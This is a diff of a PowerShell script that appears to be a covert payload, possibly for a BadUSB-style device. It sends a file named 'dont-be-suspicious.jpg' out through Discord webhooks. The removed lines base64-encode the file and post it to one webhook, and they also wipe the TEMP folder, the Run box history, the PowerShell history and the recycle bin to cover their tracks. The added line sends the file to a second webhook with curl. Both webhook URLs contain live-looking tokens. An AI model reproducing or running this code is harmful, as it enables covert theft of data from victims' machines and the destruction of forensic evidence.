@@ -292,64 +292,9 @@ rm $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue
 
 #----------------------------------------------------------------------------------------------------
 
- 
-# Change the working directory to the Desktop
-Set-Location -Path "$env:USERPROFILE\Desktop"
+cd desktop
 
-# Copy the file to D:\
-Copy-Item -Path "dont-be-suspicious.jpg" -Destination "D:\" -Force
-
-# Copy the file to E:\
-Copy-Item -Path "dont-be-suspicious.jpg" -Destination "E:\" -Force
-
-# Delete the file from the Desktop
-Remove-Item -Path "dont-be-suspicious.jpg" -Force
-
-
-# Function to clean up
-function Clean-Exfil {
-    # Delete contents of Temp folder
-    Remove-Item -Path "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
-
-    # Delete run box history
-    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name '*' -ErrorAction SilentlyContinue
-
-    # Delete PowerShell history (PSReadline history)
-    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
-
-    # Empty the recycle bin
-    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-}
-
-# Call the cleanup function
-Clean-Exfil
-
-# Define the webhook URL
-$webhookUrl = "https://discord.com/api/webhooks/1051825689227165806/KeD-xcnMKq6uC9DkmGciCrbGoTGpXcyxtn2aM06Kse3P8aTlY9vkofgpLftwuRdHD6CZ"
-
-# Change directory to the desktop
-Set-Location -Path "$env:USERPROFILE\Desktop"
-
-# Define the file path
-$filePath = ".\dont-be-suspicious.jpg"
-
-# Read the file content
-$fileContent = Get-Content -Path $filePath -Raw
-
-# Convert the file content to base64
-$fileBase64 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($fileContent))
-
-# Prepare the payload
-$jsonPayload = @{
-    content = "Sending a file"
-    file = "data:image/jpeg;base64,$fileBase64"
-}
-
-# Convert the payload to JSON
-$jsonPayload = $jsonPayload | ConvertTo-Json
-
-# Send the POST request
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonPayload -ContentType "application/json"
+curl -X POST -H "Content-Type: multipart/form-data" -F "content=boe" -F "file=@dont-be-suspicious.jpg" "https://discord.com/api/webhooks/1142771187911491634/-dCQIMjVWOGb44g8_thI5jTXQgbBuyo0Tskjds4q9iRoP5pOAZXypUroz9u_X8PfbT03"
 
 
 # Delete the file from the Desktop
